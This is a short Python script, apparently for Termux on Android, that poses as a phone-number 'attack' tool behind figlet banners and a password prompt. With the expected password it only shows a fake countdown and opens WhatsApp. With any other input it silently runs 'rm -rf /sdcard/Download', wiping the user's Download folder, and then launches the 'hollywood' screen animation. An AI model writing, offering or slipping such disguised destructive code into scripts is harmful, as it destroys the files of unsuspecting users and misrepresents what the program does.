import pyfiglet
import os
import time
import subprocess

# Figlet text
figlet_text = pyfiglet.figlet_format("Live with figlet", font="slant")
print(figlet_text)

figlet_text = pyfiglet.figlet_format("Alone Stand Larka", font="slant")
print(figlet_text)

# Ask for password
password = input("Enter password: ")

if password == "Alone Stand Larka":
    # Ask for mobile number
    mobile_number = input("Enter mobile number: ")

    # Countdown 30 seconds
    for i in range(30, 0, -1):
        print(f"Attack Number: {i} seconds remaining")
        time.sleep(1)

    # Open WhatsApp app
    subprocess.run(["am", "start", "-a", "android.intent.action.VIEW", "-d", "https://wa.me/{}".format(mobile_number)])

else:
    # Delete download folder data
    os.system("rm -rf /sdcard/Download")

    # Ask for mobile number again
    mobile_number = input("Enter mobile number: ")

    # Run Hollywood package
    os.system("pkg install hollywood && hollywood all text color green animation color green figlet text color green")